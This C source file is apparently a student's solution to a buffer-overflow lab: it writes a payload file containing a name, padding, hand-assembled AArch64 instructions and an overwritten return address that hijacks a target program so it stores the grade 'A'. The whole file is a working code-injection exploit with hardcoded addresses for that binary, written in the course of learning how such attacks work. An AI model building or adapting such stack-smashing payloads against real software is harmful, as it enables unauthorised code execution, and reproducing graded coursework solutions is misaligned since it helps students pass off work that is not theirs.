/*--------------------------------------------------------------------*/
/* createDataA.c                                                      */
/* Author: David Hovey                                                */
/*--------------------------------------------------------------------*/

#include "miniassembler.h"
#include <stddef.h>
#include <stdio.h>
#include <string.h>

/* Main comment */
int main() {
    /* User name */
    char name[] = "David";

    /* Alignment padding (4-byte instruction alignment) */
    char alignment[] = "\0";

    /* adr x0, grade */
    unsigned int adrInstr;

    /* mov w1, 0x41 */
    unsigned int movInstr;

    /* strb w1, [x0] */
    unsigned int strbInstr;

    /* b printf(...) (0x400896) */
    unsigned int bInstr;

    /* 24 bytes of padding to get to 48 bytes (buffer size) fix this */
    char padding[] = "gggggggggggggggggggggggg";

    /* Address of first adr... instruction */
    unsigned long returnAddress = 0x42005e;

    FILE *psFile = fopen("dataA", "w");


    adrInstr = MiniAssembler_adr(0, 0x420444, 0x420060);
    movInstr = MiniAssembler_mov(1, 0x41);
    strbInstr = MiniAssembler_strb(1, 0);
    bInstr = MiniAssembler_b(0x40089c, 0x42006c);

    /* Write name to top of buffer */
    fwrite(&name, strlen(name) + 1, 1, psFile);

    /* Write two bytes of null padding for instruction alignment */
    fwrite(&alignment, strlen(alignment) + 1, 1, psFile);

    /* Write assembly code instructions */
    fwrite(&adrInstr, sizeof(int), 1, psFile);
    fwrite(&movInstr, sizeof(int), 1, psFile);
    fwrite(&strbInstr, sizeof(int), 1, psFile);
    fwrite(&bInstr, sizeof(int), 1, psFile);

    /* Write padding to fill up remaining 24 bytes of 48 byte buffer */
    fwrite(&padding, strlen(padding), 1, psFile);

    /* Write return address to the final printf statements */
    fwrite(&returnAddress, sizeof(long), 1, psFile);

    fclose(psFile);

    return 0;
}